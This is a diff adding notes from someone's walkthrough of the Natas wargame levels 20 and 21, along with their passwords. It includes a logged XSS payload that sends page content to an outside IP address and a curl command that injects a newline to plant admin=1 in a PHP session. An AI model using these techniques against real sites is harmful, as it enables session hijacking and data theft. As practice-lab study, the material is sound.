@@ -222,5 +222,58 @@ that's with `python -u` for what I thought was unbuffered input.  Too many pipes
 ### natas20: eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF
 
 This looks like reading through a bunch of PHP, which means I'm done for tonight.
+Looks like you're trying to get it to read from an existing file which has admin=1 set. 
+Not sure where those session ids come from, it seems like you need to be able to influence 
+that to start reading from the filesystem.
+
+Nope, looks like XSS. Chrome has (helpfully?) blocked this XSS attempt. Which is cool, but not
+exactly what I want right now. First thought is to add a script that sends document.cookie off to
+a webserver I've set up somewhere else so I can hijack other people's sessions. Hopefully an 
+admin would do that and I could log in as them and see the password for the next level. But that'd
+need some kind of background job pulling the page as an admin regularly, and I'd need to set up
+a webserver somewhere to harvest the session identifiers.
+
+And it looks like the HttpOnly parameter is set on the cookie, so I can't get at it with Javascript.
+But I guess if the admin is logged in, the Password is displayed on the page, so I guess I could 
+have the document.innerHTML sent off somewhere. Again, though, there would have to be a background
+job running pulling down the admin page all the time.
+
+I got it to the point where the XSS is sending the page content off to a webserver of my choice.
+But the admin needs to view this page to get it to work. I think my approach is off. There needs to
+be some report that the admin will run to view everyone's names.  You'd need to get the admin to
+read the file using your session, which I guess you could do by mailing them a link with PHPSESSID
+set in the GET parameters.
+
+```
+[08/Apr/2019 22:43:09] "GET /?poop=%0A%3Ch1%3Enatas20%3C/h1%3E%0A%3Cdiv%20id%3D%22content%22%3E%0AYou%20are%20logged%20in%20as%20a%20regular%20user.%20Login%20as%20an%20admin%20to%20retrieve%20credentials%20for%20natas21.%0A%3Cform%20action%3D%22index.php%22%20method%3D%22POST%22%3E%0AYour%20name%3A%20%3Cinput%20name%3D%22name%22%20value%3D%22%22%3E%3Cscript%3Enew%20Image%28%29.src%3D%22http%3A//35.229.49.155%3Fpoop%3D%22%20+%20escape%28document.body.innerHTML%29%3B%3C/script%3E%3C/form%3E%3C/div%3E/ HTTP/1.1" 200 -
+```
+
+Alos, It doesn't seem right that I should try enumerating a ton of sessions.  The session names are 
+generated with `session_start()` and they change like crazy, so there would be too many.
+
+I wonder if the problem is with that serialization algorithm, and being able to break out of
+the session storage and read `/etc/natas_webpass/*` and start pulling out passwords that way.
+Trying to send a new `PHPSESSID=abc` means you read from `/var/lib/php5/sessions/mysess_abc`.  It
+masks out any non alnum chars or dash. So it doesn't look like you can read or write from any 
+location on the filesystem, which is what we want.
+
+Ahem, after a quick look at someone else's thoughts on the matter, it looks like that session
+algorithm is the way to go. The key is hiding extra information inside the session file, namely
+the admin=1 parameter.  So if you can hide a newline in the name parameter, you can sneak a second
+key into that session dictionary that'll get read out the next time the page gets loaded.
+
+```
+$ curl --basic -u natas20:eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF natas20.natas.labs.over/index.php?debug=yes --cookie PHPSESSID=p1dvr1e7vhirhmfsiehp59tg67 -F $'name=abc123\nadmin 1' -v
+```
+
+I should have spent more tiem auditing that session code, as it was the biggest piece
+of information I had to go with.  I guess that reflects how much I like reading PHP.  On the 
+face of it, the code looked okay, but I should have dug in harder.
+
+### natas21: IFekPyrQXftziDEsUr3x21sYuahypdgJ
  
+Looks like both sites share the same session backend. Filesystem probably. With that CSS page
+it looks like you can inject admin=1 by editing the form, and if you send the 2nd site's PHPSESSID
+to the site that'll display admin, it should pull it.  But it didn't.  Will try again tomorrow.
+Rather than these manual steps in the browser I'll set up a script.
 
